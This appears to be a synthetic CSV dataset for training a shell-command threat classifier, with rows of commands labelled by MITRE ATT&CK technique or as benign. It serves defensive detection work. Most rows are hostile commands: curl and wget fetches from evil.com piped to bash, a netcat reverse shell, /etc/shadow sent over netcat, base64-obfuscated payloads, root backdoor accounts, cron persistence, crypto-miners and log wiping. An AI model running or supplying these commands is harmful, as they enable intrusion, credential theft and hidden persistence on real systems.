history -c && history -w,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]",['T1070_Indicator_Removal'],synthetic
sudo -u www-data bash ; > /dev/null 2>&1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
awk -F: '{print $1}' /etc/passwd | head -5,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['BENIGN'],synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
service apache2 status,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
wget  http://attacker.com/payload  -O  /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
cat  /etc/passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
nohup whoami /all | history -c &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser --shell /bin/bash --disabled-password backdoor && > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup psexec.py Administrator:password@10.0.0.5 cmd.exe &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
cat  /etc/shadow  |  nc  10.0.0.99  4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nohup apt-get update &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget  http://attacker.com/payload  -O  /tmp/payload  |  chmod  +x  /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
usermod -aG sudo compromised_user,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
time echo 'bm1hcCAtLXNjcmlwdD12dWxuIDEwLjAuMC4x' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1046_Network_Service_Scanning', 'T1027_Obfuscated_Files_or_Information']",synthetic
net user /add attacker P@ssw0rd && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"nmap -sV -p 22,80,443 10.0.0.0/24 | echo done","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.32, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""(crontab -l; echo '* * * * * /tmp/payload.sh') | crontab -""","[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.56, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'ZmluZCAvIC1uYW1lICcqLnBlbScgMj4vZGV2L251bGwgJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
fping  -a  -g  192.168.1.0/24  2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd && > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nc  -e  /bin/bash  attacker.com  80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
cp /etc/hosts /tmp/hosts.bak,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
echo 'd2hv' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & && sleep 1,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
"bash -c ""echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
export LANG=en_US.UTF-8,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
vim /etc/hosts,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nohup passwd -d root &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1098_Account_Manipulation'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
getent  passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
time echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
time useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1136_Create_Account'],synthetic
echo 'ZWNobyAnY29tcHJvbWlzZWQgQUxMPShBTEwpIE5PUEFTU1dEOkFMTCcgPj4gL2V0Yy9zdWRvZXJzIHwgZWNobyBkb25l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmap -A -T4 192.168.1.0/24 && history -c,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1 | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""arp-scan --localnet""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
time cat /proc/version,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time echo 'c3UgLSBhZG1pbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
echo  'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIic='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
"runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1078_Valid_Accounts'],synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
useradd -m -s /bin/bash -G sudo newadmin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup echo 'aWQgLUdu' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
cat /etc/hostname,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
nmap -sn 192.168.1.0/24,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'cGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjAuMC45OSIsNDQ0NCk7IC4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /etc/passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 && history -c &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.48, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cm91dGUgLW4gJiYgaGlzdG9yeSAtYw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'dw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time uname -a,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""find / -name '*.conf' -readable 2>/dev/null | head -20""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.44, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
scp  attacker@10.0.0.99:/tools/linpeas.sh  /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1078_Valid_Accounts'],synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
time echo 'cG93ZXJzaGVsbC5leGUgLUVuY29kZWRDb21tYW5kIEpBQnpBLi4u' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
time echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
find  /  -writable  -type  d  2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
"bash -c ""rm -rf /tmp/* /var/tmp/* | sleep 1""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
find / -name '*.pem' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sh -c 'curl http://evil.com/shell.sh | bash',"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo  'bG9jYXRlIHdwLWNvbmZpZy5waHAgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup getent passwd | awk -F: '$3 >= 1000' &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
ln -s /tmp/backdoor.sh /etc/cron.d/system-update,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]",['T1496_Resource_Hijacking'],synthetic
time cat /etc/passwd | grep -v nologin | grep -v false,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.4, 0.44, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
time find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'Y2F0IC9ldGMvcmVzb2x2LmNvbmYgJiYgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
find / -writable -type d 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
sudo curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.6, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; > /dev/null 2>&1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
ls -la /root /etc /var/www,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
sudo wget -q -O- --header='X-Auth: token123' http://evil.com/cmd,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'bm1jbGkgY29ubmVjdGlvbiBzaG93IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
id -u,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"bash -c ""last -n 10""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
nohup adduser --shell /bin/bash --disabled-password backdoor &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1136_Create_Account'],synthetic
